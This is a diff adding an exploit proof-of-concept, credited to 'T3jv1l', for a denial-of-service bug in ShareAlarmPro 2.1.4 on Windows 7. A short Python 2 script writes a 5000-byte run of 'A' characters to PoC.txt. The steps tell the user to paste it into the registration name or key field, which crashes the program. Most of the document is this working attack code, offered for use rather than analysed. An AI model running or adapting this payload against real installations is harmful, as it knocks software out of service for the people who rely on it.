@@ -1,0 +1,29 @@
+# Exploit Title:ShareAlarmPro 2.1.4 - Denial of Service (PoC)
+# Date: 2018-12-25
+# Exploit Author: T3jv1l
+# Vendor Homepage: :http://www.nsauditor.com
+# Software: http://sharealarm.nsauditor.com/downloads/sharealarmpro_setup.exe
+# Contact: https://twitter.com/T3jv1l
+# Version:ShareAlarmPro 2.1.4
+# Tested on: Windows 7 SP1 x86
+
+# PoC:
+# 1.  Download and install the setup file
+# 2.  A file "PoC.txt" will be created
+# 3.  Click Help > Register... in tool bar
+# 4.  Copy the contents of the file (PoV.txt) and paste in the Registration Key/Name field 
+# 5.  Click OK and BOOMMMM !!!! 
+
+#!/usr/bin/python
+
+buffer = "\x41" * 5000
+
+payload = buffer
+try:
+    f=open("PoC.txt","w")
+    print "[+] Creating %s bytes payload..." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
